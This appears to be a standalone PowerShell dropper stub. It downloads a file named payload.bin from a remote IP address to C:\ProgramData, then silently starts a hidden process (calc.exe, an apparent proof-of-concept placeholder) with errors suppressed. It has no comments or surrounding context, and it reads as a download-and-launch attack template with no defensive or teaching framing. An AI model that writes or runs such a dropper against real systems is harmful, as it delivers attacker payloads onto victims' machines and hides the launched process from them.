
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://192.0.2.112/payload.bin',
    [string]$PayloadPath = "C:\ProgramData\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $PayloadPath)
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
Set-Location -Path $env:TEMP
